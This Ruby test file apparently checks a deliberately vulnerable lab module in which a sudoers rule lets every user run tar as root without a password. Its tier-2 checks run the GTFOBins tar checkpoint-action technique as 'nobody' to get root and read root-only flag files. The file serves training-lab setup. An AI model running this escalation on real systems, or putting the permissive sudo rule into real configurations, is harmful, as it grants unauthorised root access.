require_relative '../../../../../lib/post_provision_test'


class SudoRootTarTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_tar'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # read_facts: leaked_filenames and strings_to_leak (both checked below)
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_tar", 'root:root 440')
      test_local_command('sudoers rule allows tar as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_tar', 'ALL  ALL=(root) NOPASSWD: /bin/tar *, /usr/bin/tar *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers configuration is valid', 'visudo -c 2>&1; echo rc=$?', 'rc=0')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      test_local_command('unprivileged user can list the tar sudo rule', 'sudo -n -l', '/usr/bin/tar *', user: 'nobody')
      # the misconfiguration: GTFOBins "tar" sudo technique (checkpoint-action=exec) runs a command as root
      cmd = %q{sudo -n /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id}
      test_local_command('unprivileged user runs a command as root via tar sudo', cmd, 'uid=0(root)', user: 'nobody')
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        read_cmd = "sudo -n /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=#{Shellwords.escape("cat #{Shellwords.escape("/root/#{fname}")}")}"
        test_local_command("unprivileged user reads leaked #{fname} via tar sudo", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
      end
    end
    # TODO tier 3 (exploit): hand-written — with_throwaway_ssh_user runs the GTFOBins tar sudo technique and reads the root-only flag
  end

end

SudoRootTarTest.new.run
